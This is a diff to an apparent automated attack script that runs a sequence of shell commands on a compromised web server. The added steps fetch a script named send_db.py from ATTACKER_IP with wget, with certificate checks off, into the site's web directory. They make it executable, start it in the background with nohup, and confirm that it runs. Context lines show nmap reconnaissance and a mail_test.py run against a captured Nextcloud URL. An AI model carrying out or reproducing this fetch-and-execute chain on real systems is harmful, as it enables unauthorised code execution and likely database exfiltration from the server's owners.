@@ -462,6 +462,27 @@ if __name__ == "__main__":
         "ip addr show",
         "ip route show",
         
+        # Step 2a: Check current directory
+        "pwd",
+        
+        # Step 2b: Navigate to web directory and verify
+        "cd /var/www/secureskies/secureskies && pwd",
+        
+        # Step 2c: Download send_db.py script
+        f"cd /var/www/secureskies/secureskies && wget -T 60 -t 5 --no-check-certificate http://{ATTACKER_IP}:{HTTP_PORT}/attacker_flow/send_db.py -O send_db.py 2>&1",
+        
+        # Step 2d: Verify download
+        "ls -lh /var/www/secureskies/secureskies/send_db.py",
+        
+        # Step 2e: Make it executable
+        "chmod +x /var/www/secureskies/secureskies/send_db.py",
+        
+        # Step 2f: Execute send_db.py in background
+        "cd /var/www/secureskies/secureskies && nohup python3 send_db.py > /tmp/send_db.log 2>&1 & echo 'send_db.py started in background'",
+        
+        # Step 2g: Verify the process is running
+        "ps aux | grep send_db.py | grep -v grep",
+        
         # # Step 3: Check if nmap is installed
         "which nmap",
         
@@ -542,7 +563,6 @@ if __name__ == "__main__":
         
         # Step 17a-9: Execute mail_test.py with captured URL as parameter
         "cd /tmp/nmap_transfer && python3 mail_test.py '{NEXTCLOUD_URL}' 2>&1",
-
         # Step 18: Show network configuration for reference
         # "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
         
